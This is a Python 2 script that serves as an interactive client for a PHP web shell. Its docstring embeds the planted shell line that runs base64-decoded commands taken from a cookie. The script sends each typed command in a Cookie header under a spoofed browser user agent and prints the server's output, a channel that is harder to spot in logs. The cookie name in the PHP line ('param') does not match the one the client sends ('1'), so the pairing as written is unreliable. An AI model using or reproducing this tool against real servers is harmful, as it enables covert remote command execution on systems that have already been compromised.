#!/usr/bin/env python
"""
Written by Ahmed Shawky @lnxg33k
The following code is an alternative for GET and POST methods
as it uses _COOKIE global variable instead.
Should work with:
    <?php system(base64_decode($_COOKIE["param"])); ?>
"""

from urllib2 import build_opener, HTTPHandler
from sys import argv


def execute(command, agent, debugLevel=0):
    opener = build_opener(HTTPHandler(debuglevel=debugLevel))
    opener.addheaders = [
        ('User-Agent', agent),
        ('Cookie', '1={0}'.format(command.encode('base64'))),
    ]
    sc = opener.open(argv[1])  # 'http://localhost/uploads/co.php'
    print '\033[31m' + sc.read().strip() + '\033[0m'


def main():
    print "[+] Debug Level is set to be 0."

    agent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; "
    agent += "WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; "
    agent += ".NET CLR 3.5.30729; .NET CLR 3.0.30729; "
    agent += "Media Center PC 6.0; .NET4.0C; .NET4.0E)"

    while True:

        command = raw_input('shell:$ ')

        if command != 'exit':
            execute(command, agent)
        else:
            break

if __name__ == '__main__':
    main()
